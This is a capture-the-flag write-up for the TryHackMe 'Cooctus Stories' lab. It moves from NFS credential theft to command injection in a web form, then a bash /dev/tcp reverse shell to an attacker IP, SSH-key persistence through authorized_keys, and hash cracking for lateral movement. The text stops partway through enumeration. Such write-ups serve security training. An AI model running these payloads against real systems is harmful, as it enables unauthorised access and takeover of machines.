# TryHackMe-Cooctus Stories

**Scope:**

- Mount Process
- Remote Code Execution (RCE)
- NFS (Network File System)
- Git
- Crontab

**Keywords:**

- ROT13 Decoding
- SSH Connection
- Remote Code Execution (RCE)
- NFS (Network File System)
- Git Logs
- tcpdump
- Crontab Manipulation
- GPG
- Binary
- Mount Process

**Main Commands:**

- `nmap -sSVC -T4 -A -O -oN nmap_result.txt -Pn -p- --min-rate 1000 --max-retries 3 $target_ip`
- `wfuzz -u http://cooctus.thm:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt --hc 403,404,500,501,502,503 -t 50 -L -c`
- `showmount -e $target_ip`
- `mount -t nfs $target_ip:/var/nfs/general cooctus/mnt`
- `sudo tcpdump -i eth0 icmp`
- `echo "pureelpbxr" | tr 'A-Za-z' 'N-ZA-Mn-za-m'`
- `chmod 600 rootid`
- `ssh -i rootid root@cooctus.thm -p 22`

**System Commands:**

- `bash -c 'bash -i >& /dev/tcp/10.10.119.174/10222 0>&1'`
- `sudo /bin/umount -l /opt/CooctFS`
- `find /opt/CooctFS/ -type f -perm -u=s -user root -ls 2>/dev/null`
- `sudo -l`
- `git diff 8b8daa41120535c569d0b99c6859a1699227d086 6919df5c171460507f69769bc20e19bd0838b74d`
- `git log`
- `find / -type d -maxdepth 3 -group os_tester  -ls 2>/dev/null`
- `find / -type f -group os_tester -ls 2>/dev/null`
- `gpg --import /media/tuxling_2/private.key`
- `gpg --list-key`
- `gpg --decrypt /media/tuxling_2/fragment.asc`
- `for line in `cat /home/tux/tuxling_1/nootcode.c  | grep define  | awk '{print "s/"$2"/"$3"/g"}' | tr '\\n' ';' | sed 's/;$//'; do echo sed -e \'$line\' /home/tux/tuxling_1/nootcode.c | bash; done`
- `ssh-keygen`

### Laboratory Environment

[Cooctus Stories](https://tryhackme.com/r/room/cooctusadventures)

### Penetration Approaches and Commands

> **Network Enumeration Phase**
> 

`nmap -sSVC -T4 -A -O -oN nmap_result.txt -Pn -p- --min-rate 1000 --max-retries 3 $target_ip`

```bash
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e54462919008995de8554f69ca021c10 (RSA)
|   256 e5a7b01452e1c94e0db81adbc5d67ef0 (ECDSA)
|_  256 029718d6cd3258175043ddd22fba1553 (ED25519)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      46239/udp   mountd
|   100005  1,2,3      50543/tcp   mountd
|   100005  1,2,3      55782/udp6  mountd
|   100005  1,2,3      58517/tcp6  mountd
|   100021  1,3,4      36333/udp   nlockmgr
|   100021  1,3,4      36427/tcp6  nlockmgr
|   100021  1,3,4      39741/udp6  nlockmgr
|   100021  1,3,4      41513/tcp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
8080/tcp  open  http     Werkzeug httpd 0.14.1 (Python 3.6.9)
|_http-title: CCHQ
|_http-server-header: Werkzeug/0.14.1 Python/3.6.9
33789/tcp open  mountd   1-3 (RPC #100005)
38183/tcp open  mountd   1-3 (RPC #100005)
41513/tcp open  nlockmgr 1-4 (RPC #100021)
50543/tcp open  mountd   1-3 (RPC #100005)
```

> **HTTP Port Check**
> 

`curl -iLX GET -D response.txt http://cooctus.thm:8080`

```bash
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 603
Server: Werkzeug/0.14.1 Python/3.6.9
Date: Sun, 12 Jan 2025 11:23:54 GMT

<!DOCTYPE html>
<head>
<title>CCHQ</title>
<style>
    body {

        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
        color: white;
        background-size: 100%;
        background-image: url("/static/desert.jpg");
    }
    footer{
        font-size: x-small;
        position: fixed;
        bottom: 0;
        right: 0;
    }
</style>
</head>
<body>
    <h1>Cooctus Clan Secure Landing Page</h1>

<footer>
    <a href="https://www.freepik.com/vectors/tree">Desert vector created by brgfx - www.freepik.com</a>
</footer>
</body>
</head>
</html> 
```

> **Directory Scan & Endpoint Control Phase**
> 

`wfuzz -u http://cooctus.thm:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt --hc 403,404,500,501,502,503 -t 50 -L -c`

```bash
000000777:   200        17 L     42 W       556 Ch      "cat"                                                   
000002347:   200        17 L     42 W       556 Ch      "login"
```

`curl -iLX GET http://cooctus.thm:8080/login`

```bash
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 556
Server: Werkzeug/0.14.1 Python/3.6.9
Date: Sun, 12 Jan 2025 11:27:14 GMT

<html>
        <head>
                <title>C.A.T login</title>
                <meta name="viewport" content="width=device-width, initial-scal=1.0">
                <link href="static/bootstrap.min.css" rel="stylesheet" media="screen">
        </head>
        <body>
                <div class="container">
                        <h1>Cookieless login page</h1>
                        <br>
                        <form action="" method="post">
                                <input type="text" placeholder="Username" name="username" value="">
                                <input type="password" placeholder="Password" name="password" value="">
                                <input class="btn btn-default" type="submit" value="Login">
                        </form>
                </div>
        </body>
</html> 
```

`curl -iLX GET http://cooctus.thm:8080/cat`

```bash
HTTP/1.0 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 219
Location: http://cooctus.thm:8080/login
Server: Werkzeug/0.14.1 Python/3.6.9
Date: Sun, 12 Jan 2025 11:27:41 GMT

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 556
Server: Werkzeug/0.14.1 Python/3.6.9
Date: Sun, 12 Jan 2025 11:27:41 GMT

<html>
        <head>
                <title>C.A.T login</title>
                <meta name="viewport" content="width=device-width, initial-scal=1.0">
                <link href="static/bootstrap.min.css" rel="stylesheet" media="screen">
        </head>
        <body>
                <div class="container">
                        <h1>Cookieless login page</h1>
                        <br>
                        <form action="" method="post">
                                <input type="text" placeholder="Username" name="username" value="">
                                <input type="password" placeholder="Password" name="password" value="">
                                <input class="btn btn-default" type="submit" value="Login">
                        </form>
                </div>
        </body>
</html> 
```

> **NFS (Network File System) Enumeration**
> 

`showmount -e $target_ip`

```bash
Export list for 10.10.123.31:
/var/nfs/general *
```

`mkdir -p cooctus/mnt`

`mount -t nfs $target_ip:/var/nfs/general cooctus/mnt`

```bash
total 12
4 drwxr-xr-x 2 nobody nogroup 4096 Nov 21  2020 .
4 drwxr-xr-x 3 root   root    4096 Jan 12 11:31 ..
4 -rw-r--r-- 1 root   root      31 Nov 21  2020 credentials.bak
```

`cat cooctus/mnt/credentials.bak`

```bash
paradoxial.test
ShibaPretzel79
```

> **Internal System Access & Remote Code Execution (RCE) Phase**
> 

![image.png](image.png)

![image.png](image%201.png)

![image.png](image%202.png)

`sudo tcpdump -i eth0 icmp`

```bash
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

![image.png](image%203.png)

**PAYLOAD:**

```bash
payload=0 | ping -c 1 10.10.40.108
```

```bash
11:42:56.172186 IP cooctus.thm > ip-10-10-40-108.eu-west-1.compute.internal: ICMP echo request, id 1343, seq 1, length 64
11:42:56.172201 IP ip-10-10-40-108.eu-west-1.compute.internal > cooctus.thm: ICMP echo reply, id 1343, seq 1, length 64

2 packets captured
5 packets received by filter
0 packets dropped by kernel
```

> **Reverse Shell Phase**
> 

`nc -nlvp 10222`

```bash
listening on [any] 10222 ...
```

![image.png](image%204.png)

**PAYLOAD:**

```bash
bash -c 'bash -i >& /dev/tcp/10.10.119.174/10222 0>&1'
```

```bash
listening on [any] 10222 ...
connect to [10.10.40.108] from (UNKNOWN) [10.10.123.31] 48978
bash: cannot set terminal process group (725): Inappropriate ioctl for device
bash: no job control in this shell

paradox@cchq:~$ whoami
paradox
paradox@cchq:~$ id
uid=1003(paradox) gid=1003(paradox) groups=1003(paradox)
paradox@cchq:~$ pwd
/home/paradox
paradox@cchq:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
paradox@cchq:~$ export TERM=xterm

paradox@cchq:~$ ls -lsa /home
total 24
4 drwxr-xr-x  6 root    root    4096 Jan  2  2021 .
4 drwxr-xr-x 24 root    root    4096 Feb 20  2021 ..
4 drwxr-xr-x  5 paradox paradox 4096 Feb 22  2021 paradox
4 drwxr-xr-x  5 szymex  szymex  4096 Feb 22  2021 szymex
4 drwxr-xr-x  9 tux     tux     4096 Feb 20  2021 tux
4 drwxr-xr-x  7 varg    varg    4096 Feb 20  2021 varg

paradox@cchq:~$ uname -a
Linux cchq 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
paradox@cchq:~$ dpkg --version
Debian 'dpkg' package management program version 1.19.0.5 (amd64).
This is free software; see the GNU General Public License version 2 or
later for copying conditions. There is NO warranty.

paradox@cchq:~$ cat /etc/passwd | grep '/bin/bash'
cat /etc/passwd | grep '/bin/bash'
root:x:0:0:root:/root:/bin/bash
tux:x:1000:1000:tux:/home/tux:/bin/bash
szymex:x:1001:1001::/home/szymex:/bin/bash
varg:x:1002:1002::/home/varg:/bin/bash
paradox:x:1003:1003::/home/paradox:/bin/bash

paradox@cchq:~$ 
```

> **SSH Connection Phase**
> 

`cat .ssh/id_rsa.pub`

```bash
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQ/gua2YHIGXAMEJsGaQKAVCXXi4UvqjkPEw+L0c64n0VArYteuF0Q8Iz5/GDdl2y3QSm5SP1s3IAZmEal0F0D8SPMN0SY3DppGqYHHQ7s1TY76I2rZItz03yGSMkaCjQmFCE3um7mDe9LI4sO8DZWV3XxNum8jcz9teNNiqgSwKZzdIiryoY46fuU+3dgPtk31J2simLYZA2s3eNYQlUdkpmVn4XGEoL6+yHk8FPBu2/gAliSkbTGAWzhTYzCXi8pnKyDTvOB2u8986s3eBYU0WM4w0vaF3txnLOTShJB+pA3c6rfaEpCAfwKH4axoiMwkCWdSpM8hwI1eGdJV4GDzUlMLte3g2BeORkH5SGz4Tnrr5k4zwxMMuSKX0jhaAHB/GjsMfsyI0xOuZ0sLAvSEUyrAshbDEzjmXXVAin6nQ5SHwGbJom4t5NWdQAhXhACB8GMGJaj8j3QHJyzpX0XKjZDKM/u1CialgACSAopga/B9/An+atLBtXx/Ycou/E= root@kali
```

```bash
paradox@cchq:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/paradox/.ssh/id_rsa): 

Created directory '/home/paradox/.ssh'.
Enter passphrase (empty for no passphrase): 

Enter same passphrase again: 

Your identification has been saved in /home/paradox/.ssh/id_rsa.
Your public key has been saved in /home/paradox/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:MtZ04VXvmfCKNoSngogdkVgsbSgkNx/EOhHA1giO1S8 paradox@cchq
The key's randomart image is:
+---[RSA 2048]----+
|Bo@*o     . ...  |
|=O+B+.   . o   . |
|+oo=..  . o  .  .|
|  o E .o ..   o.o|
|   o .+ S. o   +.|
|  o o..o  + . .  |
| . o . . . + .   |
|        . . .    |
|                 |
+----[SHA256]-----+

paradox@cchq:~$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQ/gua2YHIGXAMEJsGaQKAVCXXi4UvqjkPEw+L0c64n0VArYteuF0Q8Iz5/GDdl2y3QSm5SP1s3IAZmEal0F0D8SPMN0SY3DppGqYHHQ7s1TY76I2rZItz03yGSMkaCjQmFCE3um7mDe9LI4sO8DZWV3XxNum8jcz9teNNiqgSwKZzdIiryoY46fuU+3dgPtk31J2simLYZA2s3eNYQlUdkpmVn4XGEoL6+yHk8FPBu2/gAliSkbTGAWzhTYzCXi8pnKyDTvOB2u8986s3eBYU0WM4w0vaF3txnLOTShJB+pA3c6rfaEpCAfwKH4axoiMwkCWdSpM8hwI1eGdJV4GDzUlMLte3g2BeORkH5SGz4Tnrr5k4zwxMMuSKX0jhaAHB/GjsMfsyI0xOuZ0sLAvSEUyrAshbDEzjmXXVAin6nQ5SHwGbJom4t5NWdQAhXhACB8GMGJaj8j3QHJyzpX0XKjZDKM/u1CialgACSAopga/B9/An+atLBtXx/Ycou/E= root@kali' > .ssh/authorized_keys
paradox@cchq:~$
```

`ssh paradox@cooctus.thm -p 22`

```bash
paradox@cchq:~$ whoami
paradox
paradox@cchq:~$ id
uid=1003(paradox) gid=1003(paradox) groups=1003(paradox)

Broadcast message from szymex@cchq (somewhere) (Sun Jan 12 11:51:01 2025):     
                                                                               
Approximate location of an upcoming Dr.Pepper shipment found:
                                                                               
                                                                               
Broadcast message from szymex@cchq (somewhere) (Sun Jan 12 11:51:01 2025):     
                                                                               
Coordinates: X: 333, Y: 173, Z: 718

```

> **Internal System Investigation & Switch User Phase**
> 

```bash
paradox@cchq:~$ cat /etc/crontab

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   szymex  /home/szymex/SniffingCat.py

paradox@cchq:~$ ls -lsa /home/szymex/SniffingCat.py
4 -rwxrwxr-- 1 szymex szymex 735 Feb 20  2021 /home/szymex/SniffingCat.py

paradox@cchq:~$ cat /home/szymex/SniffingCat.py
#!/usr/bin/python3
import os
import random

def encode(pwd):
    enc = ''
    for i in pwd:
        if ord(i) > 110:
            num = (13 - (122 - ord(i))) + 96
            enc += chr(num)
        else:
            enc += chr(ord(i) + 13)
    return enc

x = random.randint(300,700)
y = random.randint(0,255)
z = random.randint(0,1000)

message = "Approximate location of an upcoming Dr.Pepper shipment found:"
coords = "Coordinates: X: {x}, Y: {y}, Z: {z}".format(x=x, y=y, z=z)

with open('/home/szymex/mysupersecretpassword.cat', 'r') as f:
    line = f.readline().rstrip("\n")
    enc_pw = encode(line)
    if enc_pw == "pureelpbxr":
        os.system("wall -g paradox " + message)
        os.system("wall -g paradox " + coords)
        
paradox@cchq:~$ ls -lsa /home/szymex
total 44
4 drwxr-xr-x 5 szymex szymex 4096 Feb 22  2021 .
4 drwxr-xr-x 6 root   root   4096 Jan  2  2021 ..
0 lrwxrwxrwx 1 szymex szymex    9 Feb 20  2021 .bash_history -> /dev/null
4 -rw-r--r-- 1 szymex szymex  220 Jan  2  2021 .bash_logout
4 -rw-r--r-- 1 szymex szymex 3865 Feb 20  2021 .bashrc
4 drwx------ 2 szymex szymex 4096 Jan  2  2021 .cache
4 drwx------ 3 szymex szymex 4096 Jan  2  2021 .gnupg
4 drwxrwxr-x 3 szymex szymex 4096 Jan  2  2021 .local
4 -r-------- 1 szymex szymex   11 Jan  2  2021 mysupersecretpassword.cat
4 -rw-rw-r-- 1 szymex szymex  316 Feb 20  2021 note_to_para
4 -rwxrwxr-- 1 szymex szymex  735 Feb 20  2021 SniffingCat.py
4 -rw------- 1 szymex szymex   38 Feb 22  2021 user.txt

paradox@cchq:~$ cat /home/szymex/note_to_para
Paradox,

I'm testing my new Dr. Pepper Tracker script. 
It detects the location of shipments in real time and sends the coordinates to your account.
If you find this annoying you need to change my super secret password file to disable the tracker.

You know me, so you know how to get access to the file.

- Szymex

paradox@cchq:~$ 

```

`echo "pureelpbxr" | tr 'A-Za-z' 'N-ZA-Mn-za-m'`

```bash
cherrycoke
```

**For online tool:**

[CyberChef](https://gchq.github.io/CyberChef/)

`ssh szymex@cooctus.thm -p 22`

```bash
szymex@cooctus.thm's password: cherrycoke

Last login: Mon Feb 22 18:45:01 2021 from 172.16.228.1
szymex@cchq:~$ whoami
szymex
szymex@cchq:~$ id
uid=1001(szymex) gid=1001(szymex) groups=1001(szymex),1004(testers)
szymex@cchq:~$ pwd
/home/szymex

szymex@cchq:~$ getent group testers
testers:x:1004:tux,szymex

szymex@cchq:~$ ls -lsa
total 44
4 drwxr-xr-x 5 szymex szymex 4096 Feb 22  2021 .
4 drwxr-xr-x 6 root   root   4096 Jan  2  2021 ..
0 lrwxrwxrwx 1 szymex szymex    9 Feb 20  2021 .bash_history -> /dev/null
4 -rw-r--r-- 1 szymex szymex  220 Jan  2  2021 .bash_logout
4 -rw-r--r-- 1 szymex szymex 3865 Feb 20  2021 .bashrc
4 drwx------ 2 szymex szymex 4096 Jan  2  2021 .cache
4 drwx------ 3 szymex szymex 4096 Jan  2  2021 .gnupg
4 drwxrwxr-x 3 szymex szymex 4096 Jan  2  2021 .local
4 -r-------- 1 szymex szymex   11 Jan  2  2021 mysupersecretpassword.cat
4 -rw-rw-r-- 1 szymex szymex  316 Feb 20  2021 note_to_para
4 -rwxrwxr-- 1 szymex szymex  735 Feb 20  2021 SniffingCat.py
4 -rw------- 1 szymex szymex   38 Feb 22  2021 user.txt

szymex@cchq:~$ cat note_to_para
Paradox,

I'm testing my new Dr. Pepper Tracker script. 
It detects the location of shipments in real time and sends the coordinates to your account.
If you find this annoying you need to change my super secret password file to disable the tracker.

You know me, so you know how to get access to the file.

- Szymex

szymex@cchq:~$ cat mysupersecretpassword.cat
cherrycoke

szymex@cchq:~$ ls -lsa /home/tux
total 56
4 drwxr-xr-x 9 tux  tux     4096 Feb 20  2021 .
4 drwxr-xr-x 6 root root    4096 Jan  2  2021 ..
0 lrwxrwxrwx 1 tux  tux        9 Feb 20  2021 .bash_history -> /dev/null
4 -rw-r--r-- 1 tux  tux      220 Apr  4  2018 .bash_logout
4 -rw-r--r-- 1 tux  tux     3772 Feb 20  2021 .bashrc
4 drwx------ 3 tux  tux     4096 Nov 21  2020 .cache
4 drwx------ 4 tux  tux     4096 Feb 20  2021 .config
4 drwx------ 5 tux  tux     4096 Feb 20  2021 .gnupg
4 -rw------- 1 tux  tux       58 Feb 20  2021 .lesshst
4 drwx------ 5 tux  tux     4096 Jan  2  2021 .local
4 -rw-rw-r-- 1 tux  tux      630 Jan  2  2021 note_to_every_cooctus
4 drwx------ 2 tux  tux     4096 Feb 20  2021 .ssh
0 -rw-r--r-- 1 tux  tux        0 Feb 20  2021 .sudo_as_admin_successful
4 drwxrwx--- 2 tux  testers 4096 Feb 20  2021 tuxling_1
4 drwxrwx--- 2 tux  testers 4096 Feb 20  2021 tuxling_3
4 -rw------- 1 tux  tux       38 Feb 20  2021 user.txt

szymex@cchq:~$ find / -type f -group testers -ls 2>/dev/null
   791869      4 -rwxrwx---   1 tux      testers       178 Feb 20  2021 /home/tux/tuxling_3/note
   655541      4 -rw-rw----   1 tux      testers       610 Jan  2  2021 /home/tux/tuxling_1/nootcode.c
   657698      4 -rw-rw----   1 tux      testers       326 Feb 20  2021 /home/tux/tuxling_1/note
   655450      4 -rw-rw-r--   1 tux      testers      3670 Feb 20  2021 /media/tuxling_2/private.key
   655545      4 -rw-rw----   1 tux      testers       280 Jan  2  2021 /media/tuxling_2/note
   655463      4 -rw-rw-r--   1 tux      testers       740 Feb 20  2021 /media/tuxling_2/fragment.asc

szymex@cchq:~$ cat /media/tuxling_2/note
Noot noot! You found me. 
I'm Rico and this is my challenge for you.

General Tux handed me a fragment of his secret key for safekeeping.
I've encrypted it with Penguin Grade Protection (PGP).

You can have the key fragment if you can decrypt it.

Good luck and keep on nooting!

szymex@cchq:~$ cat /home/tux/tuxling_1/note
Noot noot! You found me. 
I'm Mr. Skipper and this is my challenge for you.

General Tux has bestowed the first fragment of his secret key to me.
If you crack my NootCode you get a point on the Tuxling leaderboards and you'll find my key fragment.

Good luck and keep on nooting!

PS: You can compile the source code with gcc

szymex@cchq:~$ cat /home/tux/tuxling_3/note
Hi! Kowalski here. 
I was practicing my act of disappearance so good job finding me.

Here take this,
The last fragment is: 637b56db1552

Combine them all and visit the station.

szymex@cchq:~$ cat /home/tux/tuxling_1/nootcode.c
#include <stdio.h>

#define noot int
#define Noot main
#define nOot return
#define noOt (
#define nooT )
#define NOOOT "f96"
#define NooT ;
#define Nooot nuut
#define NOot {
#define nooot key
#define NoOt }
#define NOOt void
#define NOOT "NOOT!\n"
#define nooOT "050a"
#define noOT printf
#define nOOT 0
#define nOoOoT "What does the penguin say?\n"
#define nout "d61"

noot Noot noOt nooT NOot
    noOT noOt nOoOoT nooT NooT
    Nooot noOt nooT NooT

    nOot nOOT NooT
NoOt

NOOt nooot noOt nooT NOot
    noOT noOt NOOOT nooOT nout nooT NooT
NoOt

NOOt Nooot noOt nooT NOot
    noOT noOt NOOT nooT NooT
NoOt

szymex@cchq:~$ for line in `cat /home/tux/tuxling_1/nootcode.c  | grep define  | awk '{print "s/"$2"/"$3"/g"}' | tr '\n' ';' | sed 's/;$//'`; do echo sed -e \'$line\' /home/tux/tuxling_1/nootcode.c | bash; done

#include <stdio.h>

#define int int
#define main main
#define return return
#define ( (
#define ) )
#define "f96" "f96"
#define ; ;
#define nuut nuut
#define { {
#define key key
#define } }
#define void void
#define "NOOT!
" ""NOOT!
"!\n"
#define "050a" "050a"
#define printf printf
#define 0 0
#define "What "What does the penguin say?\n"
#define "d61" "d61"

int main ( ) {
    printf ( "What ) ;
    nuut ( ) ;

    return 0 ;
}

void key ( ) {
    printf ( "f96" "050a" "d61" ) ;
}

void nuut ( ) {
    printf ( "NOOT!
" ) ;
}

szymex@cchq:~$ gpg --import /media/tuxling_2/private.key
gpg: key B70EB31F8EF3187C: public key "TuxPingu" imported
gpg: key B70EB31F8EF3187C: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

szymex@cchq:~$ gpg --list-key
/home/szymex/.gnupg/pubring.kbx
-------------------------------
pub   rsa3072 2021-02-20 [SC] [expired: 2023-02-20]
      B3C185B059F66F97534A222AB70EB31F8EF3187C
uid           [ expired] TuxPingu

szymex@cchq:~$ gpg --decrypt /media/tuxling_2/fragment.asc
gpg: Note: secret key 97D48EB17511A6FA expired at Mon 20 Feb 2023 07:58:30 PM UTC
gpg: encrypted with 3072-bit RSA key, ID 97D48EB17511A6FA, created 2021-02-20
      "TuxPingu"
The second key fragment is: 6eaf62818d

szymex@cchq:~$ 

```

**FULL FRAGMENT:**

```bash
f96050ad616eaf62818d637b56db1552
```

![image.png](image%205.png)

**OUTPUT:**

```bash
	tuxykitty
```

**For online tool:**

[CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.](https://crackstation.net/)

[Decrypt MD5, SHA1, MySQL, NTLM, SHA256, MD5 Email, SHA256 Email, SHA512, Wordpress, Bcrypt hashes for free online](https://hashes.com/en/decrypt/hash)

`ssh tux@cooctus.thm -p 22`

```bash
tux@cooctus.thm's password: tuxykitty

tux@cchq:~$ whoami
tux
tux@cchq:~$ id
uid=1000(tux) gid=1000(tux) groups=1000(tux),1004(testers),1005(os_tester)
tux@cchq:~$ pwd
/home/tux
tux@cchq:~$ getent group os_tester
os_tester:x:1005:tux,varg

tux@cchq:~$ ls -lsa /home/varg
total 48
4 drwxr-xr-x  7 varg varg      4096 Feb 20  2021 .
4 drwxr-xr-x  6 root root      4096 Jan  2  2021 ..
0 lrwxrwxrwx  1 varg varg         9 Feb 20  2021 .bash_history -> /dev/null
4 -rw-r--r--  1 varg varg       220 Jan  2  2021 .bash_logout
4 -rw-r--r--  1 varg varg      3771 Jan  3  2021 .bashrc
4 drwx------  2 varg varg      4096 Jan  3  2021 .cache
4 -rwsrws--x  1 varg varg      2146 Feb 20  2021 CooctOS.py
4 drwxrwx--- 11 varg os_tester 4096 Feb 20  2021 cooctOS_src
4 -rw-rw-r--  1 varg varg        47 Feb 20  2021 .gitconfig
4 drwx------  3 varg varg      4096 Jan  3  2021 .gnupg
4 drwxrwxr-x  3 varg varg      4096 Jan  3  2021 .local
4 drwx------  2 varg varg      4096 Feb 20  2021 .ssh
4 -rw-------  1 varg varg        38 Feb 20  2021 user.txt

tux@cchq:~$ find / -type f -group os_tester -ls 2>/dev/null

   656786      4 -rw-rw-r--   1 varg     os_tester      240 Feb 20  2021 /home/varg/cooctOS_src/.git/info/exclude
   656840      4 -rwxrwxr-x   1 varg     os_tester      189 Feb 20  2021 /home/varg/cooctOS_src/.git/hooks/post-update.sample
   656842      4 -rwxrwxr-x   1 varg     os_tester      544 Feb 20  2021 /home/varg/cooctOS_src/.git/hooks/pre-receive.sample
   656869      4 -rwxrwxr-x   1 varg     os_tester      424 Feb 20  2021 /home/varg/cooctOS_src/.git/hooks/pre-applypatch.sample
   656870      4 -rwxrwxr-x   1 varg     os_tester      478 Feb 20  2021 /home/varg/cooctOS_src/.git/hooks/applypatch-msg.sample
   656871      4 -rwxrwxr-x   1 varg     os_tester     1348 Feb 20  2021 /home/varg/cooctOS_src/.git/hooks/pre-push.sample
   657105      4 -rwxrwxr-x   1 varg     os_tester     3327 Feb 20  2021 /home/varg/cooctOS_src/.git/hooks/fsmonitor-watchman.sample
   657106      8 -rwxrwxr-x   1 varg     os_tester     4898 Feb 20  2021 /home/varg/cooctOS_src/.git/hooks/pre-rebase.sample
   657201      4 -rwxrwxr-x   1 varg     os_tester     1492 Feb 20  2021 /home/varg/cooctOS_src/.git/hooks/prepare-commit-msg.sample
   657202      4 -rwxrwxr-x   1 varg     os_tester     3610 Feb 20  2021 /home/varg/cooctOS_src/.git/hooks/update.sample
   657209      4 -rwxrwxr-x   1 varg     os_tester     1642 Feb 20  2021 /home/varg/cooctOS_src/.git/hooks/pre-commit.sample
   657210      4 -rwxrwxr-x   1 varg     os_tester      896 Feb 20  2021 /home/varg/cooctOS_src/.git/hooks/commit-msg.sample
   791856      4 -r--r--r--   1 varg     os_tester      100 Feb 20  2021 /home/varg/cooctOS_src/.git/objects/fc/d35c7ada03205aa77a743d85d660860cf14c48
   791843      8 -r--r--r--   1 varg     os_tester     4304 Feb 20  2021 /home/varg/cooctOS_src/.git/objects/08/2d88a3c97355277f55c3383bb869d3d64bcee9
   791837      4 -r--r--r--   1 varg     os_tester      707 Feb 20  2021 /home/varg/cooctOS_src/.git/objects/4c/cfcc1d5742af9ad901dac3f738154c3683de77
   791848      4 -r--r--r--   1 varg     os_tester       55 Feb 20  2021 /home/varg/cooctOS_src/.git/objects/67/4f1b1ae6d994272a46ecfd208d201d1426c83c
   791858      4 -r--r--r--   1 varg     os_tester      136 Feb 20  2021 /home/varg/cooctOS_src/.git/objects/69/19df5c171460507f69769bc20e19bd0838b74d
   791862      4 -r--r--r--   1 varg     os_tester      178 Feb 20  2021 /home/varg/cooctOS_src/.git/objects/8b/8daa41120535c569d0b99c6859a1699227d086
   791839      4 -r--r--r--   1 varg     os_tester       15 Feb 20  2021 /home/varg/cooctOS_src/.git/objects/e6/9de29bb2d1d6434b8b29ae775ad8c2e48c5391
   791845      4 -r--r--r--   1 varg     os_tester      126 Feb 20  2021 /home/varg/cooctOS_src/.git/objects/00/e63886a955cede2f44534e20f884d2fda173f1
   791852      4 -r--r--r--   1 varg     os_tester       46 Feb 20  2021 /home/varg/cooctOS_src/.git/objects/72/408be6bb0c1a6976aa26162260307c52eee572
   791841      8 -r--r--r--   1 varg     os_tester     6365 Feb 20  2021 /home/varg/cooctOS_src/.git/objects/4a/01a201d5d31d5ddd9a96f54886cbf047339351
   791850      4 -r--r--r--   1 varg     os_tester       98 Feb 20  2021 /home/varg/cooctOS_src/.git/objects/26/cf7e351554b1de3fceafdfafe4105263de32d5
   791860      4 -r--r--r--   1 varg     os_tester       75 Feb 20  2021 /home/varg/cooctOS_src/.git/objects/f7/7a3cace47a909cd4473040cebfbc88820aa6bb
   791854      4 -r--r--r--   1 varg     os_tester      114 Feb 20  2021 /home/varg/cooctOS_src/.git/objects/c4/ff351c0d111d90f97d93b8171747c0144a4939
   657336      4 -rw-rw-r--   1 varg     os_tester       37 Feb 20  2021 /home/varg/cooctOS_src/.git/COMMIT_EDITMSG
   657274      4 -rw-rw-r--   1 varg     os_tester       23 Feb 20  2021 /home/varg/cooctOS_src/.git/HEAD
   791863      4 -rw-rw-r--   1 varg     os_tester       41 Feb 20  2021 /home/varg/cooctOS_src/.git/refs/heads/master
   657240      4 -rw-rw-r--   1 varg     os_tester       73 Feb 20  2021 /home/varg/cooctOS_src/.git/description
   657602      4 -rw-rw-r--   1 varg     os_tester      340 Feb 20  2021 /home/varg/cooctOS_src/.git/logs/HEAD
   657684      4 -rw-rw-r--   1 varg     os_tester      340 Feb 20  2021 /home/varg/cooctOS_src/.git/logs/refs/heads/master
   657387      4 -rw-rw-r--   1 varg     os_tester      825 Feb 20  2021 /home/varg/cooctOS_src/.git/index
   657386      4 -rw-rw-r--   1 varg     os_tester       92 Feb 20  2021 /home/varg/cooctOS_src/.git/config
   791790     24 -rwxrwx--x   1 varg     os_tester    21088 Feb 20  2021 /home/varg/cooctOS_src/games/adventure
   791793      4 -rw-rw----   1 varg     os_tester      129 Feb 20  2021 /home/varg/cooctOS_src/games/note
